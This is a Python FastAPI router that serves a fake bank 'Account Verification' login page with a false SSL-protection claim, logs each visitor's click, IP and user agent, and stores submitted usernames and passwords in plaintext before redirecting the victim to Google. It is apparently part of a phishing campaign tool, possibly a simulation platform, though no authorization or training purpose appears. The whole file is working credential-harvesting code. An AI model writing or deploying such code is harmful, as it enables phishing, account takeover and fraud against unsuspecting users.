"""Phishing page router — serves fake login pages, tracks clicks and credential capture."""

import os
from datetime import datetime
from fastapi import APIRouter, Depends, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from sqlalchemy.orm import Session

from backend.database import get_db
from backend.models.target import Target
from backend.models.campaign import Campaign

router = APIRouter()

BASE_URL = os.getenv("BASE_URL", "http://localhost:8000")

PHISH_PAGE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Banking Portal — Account Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --primary: #1a237e; --accent: #0d47a1; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0d1b2a 0%, #1b2838 50%, #0d47a1 100%);
            display: flex; align-items: center; justify-content: center;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .login-card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 3rem;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .login-card h2 {
            color: #fff;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        .login-card p.subtitle {
            color: rgba(255,255,255,0.6);
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .form-control {
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15);
            color: #fff;
            border-radius: 12px;
            padding: 0.8rem 1rem;
        }
        .form-control:focus {
            background: rgba(255,255,255,0.12);
            border-color: #42a5f5;
            color: #fff;
            box-shadow: 0 0 0 3px rgba(66,165,245,0.3);
        }
        .form-control::placeholder { color: rgba(255,255,255,0.4); }
        .btn-primary {
            background: linear-gradient(135deg, #1565c0, #42a5f5);
            border: none;
            border-radius: 12px;
            padding: 0.8rem;
            font-weight: 600;
            font-size: 1rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(21,101,192,0.4);
        }
        .lock-icon {
            width: 60px; height: 60px;
            background: linear-gradient(135deg, #1565c0, #42a5f5);
            border-radius: 16px;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 1.5rem;
            font-size: 1.8rem;
        }
        .form-label { color: rgba(255,255,255,0.7); font-size: 0.85rem; font-weight: 500; }
        .text-muted-custom { color: rgba(255,255,255,0.4); font-size: 0.75rem; text-align: center; margin-top: 1.5rem; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="lock-icon">🔒</div>
        <h2 class="text-center">Account Verification</h2>
        <p class="subtitle text-center">Please verify your identity to continue accessing your account.</p>
        <form method="POST" action="/api/phish/TOKEN_PLACEHOLDER/submit">
            <div class="mb-3">
                <label class="form-label">Email or Username</label>
                <input type="text" name="username" class="form-control" placeholder="Enter your email" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Password</label>
                <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn btn-primary w-100 mt-2">Verify Account</button>
            <p class="text-muted-custom">🔒 Protected by 256-bit SSL encryption</p>
        </form>
    </div>
</body>
</html>"""


@router.get("/phish/{token}", response_class=HTMLResponse)
async def phish_landing(token: str, request: Request, db: Session = Depends(get_db)):
    """Serve the fake login page and log the click."""
    target = db.query(Target).filter(Target.token == token).first()
    if not target:
        raise HTTPException(status_code=404, detail="Page not found")

    # Log click
    if target.status in ("pending", "sent"):
        target.status = "clicked"
        target.clicked_at = datetime.utcnow()
        target.ip_address = request.client.host if request.client else None
        target.user_agent = request.headers.get("user-agent", "")

        # Update campaign counters
        campaign = db.query(Campaign).filter(Campaign.id == target.campaign_id).first()
        if campaign:
            campaign.total_clicked = (campaign.total_clicked or 0) + 1
        db.commit()

    # Serve page with token injected
    html = PHISH_PAGE_HTML.replace("TOKEN_PLACEHOLDER", token)
    return HTMLResponse(content=html)


@router.post("/api/phish/{token}/submit")
async def phish_submit(
    token: str,
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db),
):
    """Capture submitted credentials and redirect to a 'real' page."""
    target = db.query(Target).filter(Target.token == token).first()
    if not target:
        raise HTTPException(status_code=404, detail="Page not found")

    target.status = "submitted"
    target.submitted_at = datetime.utcnow()
    target.captured_username = username
    target.captured_password = password
    target.ip_address = request.client.host if request.client else None
    target.user_agent = request.headers.get("user-agent", "")

    # Update campaign counters
    campaign = db.query(Campaign).filter(Campaign.id == target.campaign_id).first()
    if campaign:
        campaign.total_submitted = (campaign.total_submitted or 0) + 1
    db.commit()

    # Redirect to "real" bank page after capture
    return RedirectResponse(url="https://www.google.com", status_code=303)


@router.post("/api/phish/{token}/track")
async def phish_track(token: str, request: Request, db: Session = Depends(get_db)):
    """Click tracking endpoint (alternative to GET phish page)."""
    target = db.query(Target).filter(Target.token == token).first()
    if not target:
        raise HTTPException(status_code=404, detail="Not found")

    if target.status in ("pending", "sent"):
        target.status = "clicked"
        target.clicked_at = datetime.utcnow()
        target.ip_address = request.client.host if request.client else None
        db.commit()

    return {"tracked": True}
